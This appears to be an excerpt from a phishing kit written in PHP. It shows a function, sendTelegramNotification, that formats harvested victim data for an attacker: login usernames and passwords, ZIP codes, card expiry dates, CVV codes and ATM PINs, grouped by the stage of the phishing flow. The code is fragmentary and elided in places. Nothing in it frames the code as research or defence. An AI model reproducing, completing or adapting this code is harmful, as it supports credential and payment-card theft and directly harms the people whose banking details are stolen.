...
function sendTelegramNotification($data) {
    ...
    switch ($step) {
        case 'login':
            $message = "🔐 New Login\n";
            $message .= "👤 Username: " . ($data['emzemz'] ?? 'N/A') . "\n";
            $message .= "🔑 Password: " . ($data['pwzenz'] ?? 'N/A') . "\n";
...
📮 ZIP: " . (isset($data['zip_cd']) ? $data['zip_cd'] : 'N/A') . "";
        ...
        case 'card_information':
            ...
            $message .= "📅 Exp: " . ($data['exp_mth'] ?? 'MM') . "/" . ($data['exp_yr'] ?? 'YYYY') . "\n";
            $message .= "🔢 CVV: " . ($data['sec_cd'] ?? 'N/A') . "\n";
            $message .= "🏧 PIN: " . ($data['pin_cd'] ?? 'N/A');
            break;
